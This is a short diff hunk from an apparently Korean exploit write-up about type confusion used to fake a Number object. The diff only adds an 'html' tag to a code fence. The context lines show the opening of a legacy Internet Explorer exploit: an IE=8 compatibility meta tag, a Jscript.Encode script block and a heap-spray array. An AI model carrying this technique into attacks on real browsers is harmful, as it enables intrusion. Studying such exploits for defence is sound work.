@@ -127,7 +127,7 @@ Type Confusion을 이용하여 가짜 Number를 구현한 코드는 다음과 �
 
 
 
-```
+```html
 <meta http-equiv="X-UA-Compatible" content="IE=8"></meta>
 <script language="Jscript.Encode">
     var arr_spray = new Array();
